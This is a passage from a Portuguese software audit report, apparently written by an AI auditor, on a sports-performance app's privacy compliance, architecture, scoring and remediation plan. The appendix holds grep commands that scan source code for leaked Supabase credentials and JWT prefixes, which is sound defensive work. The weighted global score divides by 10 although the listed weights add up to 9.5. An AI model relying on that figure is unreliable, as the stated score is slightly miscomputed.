    const start = Date.now();
    const { error } = await supabase.from('workspaces').select('count').single();
    if (error) throw error;
    return Response.json({
      status: 'ok', db: 'connected',
      latency_ms: Date.now() - start,
      version: process.env.npm_package_version,
      ts: new Date().toISOString(),
    });
  } catch (e) {
    return Response.json({ status: 'error', db: 'disconnected' }, { status: 503 });
  }
}
```

---

## 9. Compliance LGPD / GDPR

### Checklist

| Requisito | Estado | Artigo | Severidade |
|---|---|---|---|
| Política de privacidade na UI | ❌ AUSENTE | Art. 8 LGPD / Art. 7 GDPR | 🔴 CRITICAL |
| Termos de uso | ❌ AUSENTE | — | 🟠 HIGH |
| Consentimento explícito no registo | ❌ AUSENTE | Art. 8 LGPD / Art. 7 GDPR | 🔴 CRITICAL |
| Export de dados pelo utilizador | ❌ AUSENTE | Art. 18 LGPD / Art. 20 GDPR | 🟠 HIGH |
| Eliminação de conta | ❌ AUSENTE | Art. 18 LGPD / Art. 17 GDPR | 🔴 CRITICAL |
| Dados de saúde com protecção especial | ❌ SEM CRIPTOGRAFIA | Art. 11 LGPD / Art. 9 GDPR | 🔴 CRITICAL |
| Logs sem PII | ❌ 354 console.log | Art. 32 LGPD / Art. 32 GDPR | 🟠 HIGH |

---

#### [CPL-001] Dados Clínicos de Atletas sem Protecção LGPD — Categoria Especial

- **Severidade:** 🔴 CRITICAL
- **Categoria:** Compliance > LGPD Art. 11 / GDPR Art. 9
- **Evidência:** 82 ficheiros mencionam dados de saúde:
  - `src/components/athlete/modals/CreateInjuryModal.tsx` — registo de lesões
  - `src/components/athlete/drawers/InjuryDetailsDrawer.tsx` — visualização de lesões
  - `src/app/api/athletes/[id]/injuries/route.ts` — API de lesões
  - `src/supabase/migrations/` — tabelas de métricas físicas, injuries, medical_notes
- **Impacto:** Dados de saúde são "categoria especial" sob LGPD (Art. 11) e GDPR (Art. 9) — requerem consentimento explícito, finalidade específica, criptografia em repouso, e base legal própria. A ausência destes requisitos constitui infracção que pode resultar em multa de até 2% do faturamento (LGPD) ou 4% (GDPR), com máximo de €20M.
- **Remediação:**
  1. Criptografar colunas sensíveis na Supabase (pgcrypto)
  2. Criar formulário de consentimento específico para dados de saúde
  3. Adicionar política de privacidade com secção dedicada a dados clínicos
  4. Auditar quem tem acesso e criar audit log

---

#### [CPL-002] Sem Política de Privacidade / Termos de Uso

- **Severidade:** 🔴 CRITICAL
- **Categoria:** Compliance > LGPD Art. 8 / GDPR Art. 7
- **Impacto:** Não é legal operar qualquer serviço que colecte dados pessoais sem política de privacidade e base legal de tratamento.
- **Remediação mínima (1 dia de trabalho):**
  1. Criar página `/privacy` com política de privacidade (pode começar com template)
  2. Criar página `/terms` com termos de uso
  3. Adicionar checkbox "Aceito os Termos e a Política de Privacidade" no `RegisterPage.tsx`
  4. Guardar timestamp de consentimento na base de dados

---

#### [CPL-003] Sem Direito de Exclusão de Conta (Right to be Forgotten)

- **Severidade:** 🔴 CRITICAL
- **Categoria:** Compliance > LGPD Art. 18 / GDPR Art. 17
- **Impacto:** Qualquer utilizador tem o direito de solicitar a eliminação dos seus dados. A ausência de mecanismo de eliminação é infracção directa.
- **Remediação:**
```typescript
// src/app/api/user/delete/route.ts
export async function DELETE(request: Request) {
  const userId = await getAuthenticatedUserId(request);
  // 1. Anonimizar dados de atletas ligados
  // 2. Eliminar métricas, sessões, formulários
  // 3. Eliminar conta Supabase Auth
  // 4. Enviar confirmação por email
  await supabase.auth.admin.deleteUser(userId);
  return Response.json({ message: 'Conta eliminada com sucesso' });
}
```

---

## 10. Migrações de Base de Dados

### Sumário

| Tipo | Contagem | Estado |
|---|---|---|
| Total de migrações SQL | 23 | ✅ |
| `DROP TABLE` sem `IF EXISTS` | 0 | ✅ Seguro |
| `DROP COLUMN` sem `IF EXISTS` | 0 | ✅ Seguro |
| Migrações sem transação (BEGIN/COMMIT) | 0 | ✅ |
| RLS activo nas tabelas | ✅ (todas) | ✅ |
| Rollback script presente | ✅ `ROLLBACK_SPRINT_0.sql` | ✅ |
| Migrações de fix RLS (histórico de bugs) | 4 | ⚠️ |

### Achados

As migrações são o **ponto mais sólido da infraestrutura** do projecto. 23 ficheiros SQL bem organizados por timestamp, todas as operações destrutivas protegidas com `IF EXISTS`, transações garantidas, RLS activo em todas as tabelas. O único sinal de alarme são as 4 migrações de fix de RLS (`fix_registration_rls`, `fix_recursive_rls`, `fix_athletes_rls`, `debug_open_rls`), que indicam um histórico de problemas de segurança ao nível da base de dados que foram sendo corrigidos. A migration `debug_open_rls` é particularmente sensível — "open RLS" no nome pode indicar que foi temporariamente aberto o acesso sem restrições.

**Recomendação:** Auditar o estado actual das RLS policies activas (não apenas os ficheiros de migração) e testar cross-tenant access.

---

## 11. Arquitectura e Resiliência

### Arquitectura

| Verificação | Estado | Nota |
|---|---|---|
| Organização de componentes | ✅ Feature-based | `/athlete`, `/calendar`, `/shared`, `/pages` |
| Service layer centralizado | ⚠️ Parcial | `lib/` existe mas fetch directo em componentes |
| Tipos centralizados | ✅ | `src/types/` com múltiplos `.types.ts` |
| Custom hooks | ✅ ~30+ | Boa separação de responsabilidades |
| Estado global | ⚠️ App.tsx | 20+ useState no componente raiz |
| Chamadas API em componentes | ⚠️ Algumas | Deveriam estar em hooks |

### Resiliência

| Verificação | Estado | Nota |
|---|---|---|
| Error Boundaries | ✅ 2 implementações | Global + Calendar específico |
| Loading states | ✅ Excelente | 4 variantes de skeleton |
| Empty states | ✅ Excelente | 2 componentes, dicas contextuais |
| Error states em formulários | ✅ Bom | Sonner + validação inline |
| Retry logic | ❌ Ausente | Sem retry em falhas de rede |
| Timeout em requests | ❌ Ausente | Requests podem pender indefinidamente |
| Optimistic UI | ❌ Ausente | UI bloqueia em cada acção |

---

#### [RES-001] Sem Retry Logic em Chamadas de Rede

- **Severidade:** 🟡 MEDIUM
- **Impacto:** Falhas de rede temporárias ou instabilidade do Supabase resultam em erros para o utilizador sem tentativa de recuperação automática. Para uma aplicação usada durante sessões de treino (ambiente com Wi-Fi instável), isto é relevante.
- **Remediação:** Usar `swr` (já está nas dependências) com `shouldRetryOnError: true` (default) ou implementar retry manual com backoff exponencial.

---

## 12. Internacionalização

| Verificação | Estado |
|---|---|
| Sistema i18n | ❌ Ausente (sem react-i18next) |
| Idioma predominante | PT-PT (95%) |
| Inconsistências PT/EN | ⚠️ ErrorBoundary shared em EN |
| Formatação de datas | `date-fns` presente mas sem locale PT |

**Nota:** O projecto não necessita de i18n neste momento, mas a mistura de idiomas deve ser resolvida. O `ErrorBoundary.tsx` shared tem "Oops! Something went wrong" e "We apologize for the inconvenience." em inglês enquanto toda a restante UI está em PT-PT.

---

## 13. Documentação e Manutenibilidade

| Ficheiro | Existe | Qualidade |
|---|---|---|
| `README.md` | ✅ | ⚠️ Parcial (visão geral mas setup incompleto) |
| `ARCHITECTURE.md` | ❌ | — |
| `CONTRIBUTING.md` | ❌ | — |
| `CHANGELOG.md` | ❌ | — |
| `DEPLOY.md` | ❌ | — |
| `SECURITY.md` | ❌ | — |
| `.env.example` | ❌ | — |
| `API_REFERENCE.md` | ✅ | ✅ Presente |
| `SETUP_GUIDE.md` | ✅ | ✅ Presente |
| `QUALITY_CHECKLIST_FINAL.md` | ✅ | ⚠️ Sem sign-off |
| JSDoc em componentes | ❌ 0 ocorrências | — |
| Storybook | ❌ | — |

**Nota:** O projecto tem 100+ ficheiros `.md` dispersos, mas os ficheiros de documentação padrão da indústria (`ARCHITECTURE.md`, `CONTRIBUTING.md`, `CHANGELOG.md`, `DEPLOY.md`) estão ausentes.

---

## 14. Git e Versionamento

| Verificação | Estado | Nota |
|---|---|---|
| Repositório Git inicializado | ❌ NÃO | Directório não é um repo git |
| Conventional commits | N/A | Sem histórico |
| `.gitignore` raiz | ❌ AUSENTE | `.env` não está ignorado |
| Branch protection em `main` | ❌ AUSENTE | |
| Dependabot configurado | ❌ AUSENTE | |
| `.github/` pasta | ❌ AUSENTE | |
| PR template | ❌ AUSENTE | |
| CODEOWNERS | ❌ AUSENTE | |

**Impacto:** O projecto não tem qualquer processo de versionamento controlado. Sem git, não há histórico de mudanças, não é possível fazer rollback, não é possível colaborar em equipa de forma segura, e não é possível fazer deploy controlado.

---

## 15. Scorecards Semânticos

| Dimensão | Score | Peso | Justificativa |
|---|---|---|---|
| 🔒 Segurança | **1.0/10** | 2.0 | RCE via new Function(), credenciais expostas, passwords hardcoded, CSP ausente, .env versionado |
| 📝 Qualidade | **3.0/10** | 1.5 | TS strict ON (+2), ESLint (+1) mas 815 any (-2), testes <5% (-2), coupling (-1), ts-ignore (-1), console (-1) |
| ♿ Acessibilidade | **4.0/10** | 1.0 | Radix UI + HTML semântico + axe-playwright (+3) mas 20+ btn sem aria (-2), sem skip link (-1), sem reduced-motion (-1), sem aria-live (-1) |
| ⚡ Performance | **3.0/10** | 1.0 | Skeleton excelente, WebP (+1), system fonts (+1) mas sem code splitting (-2), sem lazy (-2), sem optimistic (-1) |
| 🏗️ Infraestrutura | **2.0/10** | 1.0 | CI design bom mas na pasta errada (-3), Sentry comentado (-2), sem health check (-1), sem .env.example (-1) |
| ⚖️ Compliance | **0.0/10** | 1.5 | Sem política privacidade (-3), sem consentimento (-2), PII em logs (-2), sem exclusão conta (-2), dados saúde sem protecção (-3) = -12 → 0 |
| 🛡️ Resiliência | **4.0/10** | 1.0 | ErrorBoundary ×2 (+1), 4 variantes loading (+1), Sonner feedback (+1), mas sem retry (-1), sem timeout (-1), Sentry inactivo |
| 📚 Documentação | **5.0/10** | 0.5 | README (+1), API_REFERENCE (+1), SETUP_GUIDE (+1) mas sem JSDoc (-1), sem CHANGELOG (-1), sem CONTRIBUTING (-1) |

### Cálculo do Score Global

```
Score = (1.0×2.0 + 3.0×1.5 + 4.0×1.0 + 3.0×1.0 + 2.0×1.0 + 0.0×1.5 + 4.0×1.0 + 5.0×0.5) ÷ 10.0

      = (2.0 + 4.5 + 4.0 + 3.0 + 2.0 + 0.0 + 4.0 + 2.5) ÷ 10.0

      = 22.0 ÷ 10.0

      = 2.2 / 10
```

### 📊 Score Global: 2.2 / 10 🔴 Crítico

### Maturidade CMMI por Dimensão

| Dimensão | Nível Actual | Descrição | Alvo 3 meses |
|---|---|---|---|
| Segurança | 1 — Inicial | Vulnerabilidades activas em produção | 4 — Gerido |
| Qualidade | 2 — Repetível | Práticas existem (TS strict) mas inconsistentes | 3 — Definido |
| Acessibilidade | 2 — Repetível | Radix UI bom, resto manual e incompleto | 3 — Definido |
| Performance | 2 — Repetível | Algumas optimizações, sem sistemática | 3 — Definido |
| DevOps | 1 — Inicial | Pipeline desenhado mas inactivo | 3 — Definido |
| Compliance | 0 — Inexistente | Zero compliance LGPD | 3 — Definido |

---

## 16. Consolidação Estratégica (C4)

### Matriz Valor × Esforço

| Quadrante | Achados | IDs |
|---|---|---|
| 🟢 **Quick Wins** (Alto Valor, ≤1h) | Revogar Supabase key, mover CI, .gitignore, activar Sentry, headers segurança, aria-labels, branch protection | QW-001 a QW-010 |
| 🔵 **Projectos** (Alto Valor, >1d) | Substituir new Function(), compliance LGPD completo, code splitting, testes coverage 60%, analytics, logging estruturado | SEC-001, CPL-001/002/003, PERF-001 |
| 🟡 **Dívida Controlada** (Baixo Valor, Baixo Esforço) | JSDoc, eliminar TODO/FIXME, fixar versões *, mover test deps | COD-004, COD-005, COD-003 |
| 🔴 **Reavaliar** (Baixo Valor, Alto Esforço) | i18n completo, Storybook completo, dark mode | — |

---

### Plano de 5 Fases

#### Fase 1: Preparação — Segurança Crítica (Semana 1)

**Objectivo:** Eliminar todos os blockers de produção

- [ ] **[SEC-002]** Revogar chave Supabase + criar `.gitignore` + `.env.example` | 2h | HOJE
- [ ] **[SEC-003]** Remover `MOCK_USERS` passwords de `AppContext.tsx` | 30min | HOJE
- [ ] **[SEC-001]** Substituir `new Function()` por `mathjs` nos 4 ficheiros | 6h
- [ ] **[INF-001]** Mover `ci.yml` para `.github/workflows/` e verificar execução | 30min
- [ ] **[GOV-001]** Activar branch protection em `main` + require 1 PR review | 15min
- [ ] **[SEC-005]** Adicionar CSP, HSTS, Referrer-Policy ao `next.config.js` | 20min
- [ ] **[INF-002]** Descomentar Sentry + substituir `@sentry/nextjs` por `@sentry/react` | 2h
- [ ] **[SEC-004]** Remover/sanitizar `dangerouslySetInnerHTML` em `chart.tsx` | 2h

**Resultado esperado:** Score Segurança: 1→5, Infra: 2→5

---

#### Fase 2: Compliance e Governança (Semana 2-3)

**Objectivo:** Conformidade legal mínima e processo de desenvolvimento seguro

- [ ] **[CPL-002]** Criar página `/privacy` e `/terms` com política de privacidade | 4h
- [ ] **[CPL-002]** Adicionar checkbox consentimento no `RegisterPage.tsx` | 2h
- [ ] **[CPL-003]** Criar `DELETE /api/user/account` + UI de eliminação de conta | 8h
- [ ] **[CPL-001]** Criptografar colunas de saúde sensíveis na Supabase (pgcrypto) | 8h
- [ ] **[INF-003]** Criar endpoint `GET /api/health` | 2h
- [ ] **[INF-004]** Criar `.github/dependabot.yml` para updates automáticos | 15min
- [ ] **[INF-005]** Criar `.github/PULL_REQUEST_TEMPLATE.md` | 30min
- [ ] **[COD-003]** Fixar versões de 18 dependências com `*` | 2h

**Resultado esperado:** Score Compliance: 0→4, Governança: activa

---

#### Fase 3: Qualidade e Código (Semana 4-6)

**Objectivo:** Reduzir dívida técnica e melhorar manutenibilidade

- [ ] **[COD-001]** Auditar e reduzir `any` para < 200 ocorrências (foco em APIs Supabase) | 2 dias
- [ ] **[COD-002]** Implementar `pino` + eliminar console.log sensíveis | 1 dia
- [ ] **[PERF-001]** Implementar `React.lazy` + `Suspense` para pages em App.tsx | 4h
- [ ] **[A11Y-001]** Adicionar `aria-label` a 20+ botões icon-only | 2h
- [ ] **[A11Y-002]** Adicionar `prefers-reduced-motion` global + hook Motion | 1h
- [ ] **[A11Y-003]** Criar skip link de acessibilidade | 30min
- [ ] **[A11Y-004]** Adicionar `aria-current="page"` na navegação | 30min
- [ ] **[COD-004]** Resolver FIXME críticos (decision-engine, calendar integrations) | 1 dia
- [ ] **[INF-006]** Criar `ARCHITECTURE.md` + `CONTRIBUTING.md` | 1 dia
- [ ] **[UX]** Breadcrumbs + página 404 + feedback widget | 4h

**Resultado esperado:** Score Qualidade: 3→6, Acessibilidade: 4→7

---

#### Fase 4: Resiliência e Observabilidade (Semana 7-8)

**Objectivo:** Visibilidade operacional e resiliência em produção

- [ ] Cobertura de testes de 5% → 40% (hooks críticos, componentes shared) | 1 semana
- [ ] Integrar PostHog analytics (tracking de 10 eventos-chave) | 1 dia
- [ ] Criar `GET /api/health` completo (DB, Sentry, latência) | 2h
- [ ] Configurar UptimeRobot com o endpoint de health | 30min
- [ ] Implementar retry logic com backoff exponencial em calls Supabase | 4h
- [ ] Implementar timeout de 10s em requests de rede | 2h
- [ ] Criar feedback widget in-app | 3h
- [ ] Criar `CHANGELOG.md` e adoptar conventional commits | 1h

**Resultado esperado:** Score Resiliência: 4→7, Infra: 5→8

---

#### Fase 5: Optimização e Maturidade (Semana 9-12)

**Objectivo:** Excelência operacional e product-market fit técnico

- [ ] Cobertura de testes: 40% → 70% | 2 semanas
- [ ] Optimistic UI para acções de alta frequência (create, update) | 1 semana
- [ ] Storybook para componentes partilhados | 1 semana
- [ ] Export de dados do utilizador (LGPD Art. 18) | 2 dias
- [ ] Reduzir `any` para < 50 ocorrências | 1 semana
- [ ] Capacitor: fixar `appId` + signing config Android | 2h
- [ ] Lighthouse CI com thresholds: Performance >90, A11y >90 | 4h

---

## 17. OKRs

| OKR | Baseline | Target | Prazo |
|---|---|---|---|
| Vulnerabilidades CRITICAL | 8 | 0 | Semana 2 |
| Score Segurança | 1.0/10 | 7.0/10 | Semana 4 |
| Score Compliance | 0.0/10 | 5.0/10 | Semana 6 |
| Cobertura de testes | < 5% | 40% | Semana 8 |
| `any` types | 815 | < 200 | Semana 8 |
| Score Global | 2.2/10 | 6.5/10 | Semana 12 |
| RCE vulnerabilidades | 4 ficheiros | 0 | **Semana 1** |
| `.env` exposto | Sim | Não | **Hoje** |

---

## 18. Recomendações Estratégicas

### Curto Prazo (1-2 semanas) — Desbloqueio de Produção

1. **Segurança imediata** — Revogar credenciais, eliminar RCE, fixar headers. Sem isto, a aplicação não pode ir a produção de forma responsável.
2. **Activar CI** — Mover o ficheiro para a pasta certa. 5 minutos que desbloqueiam meses de qualidade automática.
3. **Compliance mínimo** — Página de privacidade + consentimento no registo + delete account. Legal mínimo para operar.

### Médio Prazo (1-3 meses) — Maturidade de Produto

4. **Testes até 40%** — Foco nos hooks críticos (`useCalendarMetrics`, `useFormSubmissions`, `useNotifications`) e nos componentes shared. O risco de regressão com 120+ componentes e 0 testes é alto.
5. **Analytics de produto** — PostHog ou Mixpanel. Sem dados de utilização, o roadmap de produto é uma aposta.
6. **Logging estruturado** — Pino com Sentry activo. A observabilidade é a diferença entre incidentes de 5 minutos e de 5 horas.
7. **Redução de `any`** — Começar pelos tipos de resposta Supabase. O retorno de investimento é imediato em prevenção de bugs de runtime.

### Longo Prazo (3-12 meses) — Excelência Técnica

8. **Storybook** — O design system implícito é excelente; documentá-lo em Storybook reduz o tempo de onboarding de novos developers de dias para horas.
9. **Cobertura de testes 70%+** — Com o crescimento da equipa, a cobertura de testes é a única forma de manter velocity sem regredir.
10. **Architecture Decision Records (ADRs)** — Documentar as decisões técnicas (Vite vs Next.js, Supabase vs Firebase, Capacitor para mobile) para evitar retrabalho futuro.

---

## 19. Nota Final

O PerformTrack é tecnicamente ambicioso e visualmente sofisticado. A escolha de Tailwind v4.1 com OKLCH, Radix UI para acessibilidade primitiva, Motion para animações, e Supabase com RLS demonstra um nível de competência técnica acima da média para uma aplicação em fase inicial. O onboarding wizard, os loading states, os empty states e o microcopy em PT-PT são de nível produção.

O que esta auditoria revela é o clássico padrão de projectos construídos com velocidade: **a camada visível (UI/UX) está polida, mas as camadas invisíveis (segurança, compliance, infraestrutura) foram deixadas para depois**. "Depois" é agora, antes do primeiro utilizador real.

O caminho de 2.2/10 para 6.5/10 não é um reescrever — é um plano de 8-12 semanas de trabalho focalizado nos achados deste relatório. A base arquitectural é sólida o suficiente para suportar esse trabalho.

---

## Anexos

### A. Relatórios Individuais de Referência

| Protocolo | Score | Ficheiro |
|---|---|---|
| C7 — Visual Design System | 8.5/10 🟢 Bom | `relatorio-c7-visual.md` |
| C8 — Post-Production Resilience | 3.0/10 🟠 Fraco | `relatorio-c8-postproducao.md` |
| C9 — UX & Onboarding Pro | 6.6/10 🟡 Médio | `relatorio-c9-ux.md` |
| **Master — Auditoria Forense** | **2.2/10 🔴 Crítico** | `relatorio-master-audit.md` |

### B. Pontos Fortes Consolidados (para preservar)

| Área | Detalhe |
|---|---|
| Design System | OKLCH palette, zero inline styles, zero classes arbitrárias, z-index limpo |
| UX Walkthrough | Loading states (4 variantes), empty states (dicas), error boundaries ×2, success toasts |
| Onboarding | Wizard 3-step coach/atleta, indicador de progresso, microcopy PT-PT exemplar |
| Migrações SQL | 23 ficheiros, IF EXISTS em tudo, RLS activo, rollback script presente |
| TypeScript | Strict mode ON, noUnusedLocals, noUnusedParameters — configuração máxima |
| Radix UI | Primitivos WAI-ARIA correctos, focus management automático em modais |
| Responsividade | Mobile-first, 3 breakpoints, tokens responsivos automáticos |

### C. Comandos de Verificação Pós-Remediação

```bash
# Verificar que .env não está no git:
git check-ignore -v .env

# Confirmar que CI está a correr:
gh workflow list
gh run list --workflow=ci.yml

# Verificar headers de segurança:
curl -I https://your-app.vercel.app | grep -E "content-security|strict-transport|referrer"

# Verificar que new Function() foi eliminado:
grep -rn "new Function(" src/ --include="*.ts" --include="*.tsx"

# Verificar que credentials não estão no código:
grep -rn "supabase\.co\|eyJhbGci" src/ --include="*.ts" --include="*.tsx"

# Health check:
curl https://your-app.vercel.app/api/health
```

### D. Achados Filtrados (excluídos por serem em testes/scripts)

- 12 usos de `new Function()` em ficheiros de teste e scripts de migração — excluídos
- 2 usos de `dangerouslySetInnerHTML` em ficheiros `.stories.tsx` — excluídos

---

*Audit Master Protocol v2.1 | C7 Visual + C8 Post-Production + C9 UX Pro*
*Projecto: PerformTrack (V-Login2) | Data: 2026-03-28 | Auditor: Claude*
*Total de verificações: 44 | Total de achados: 61 | Filtrados: 14*
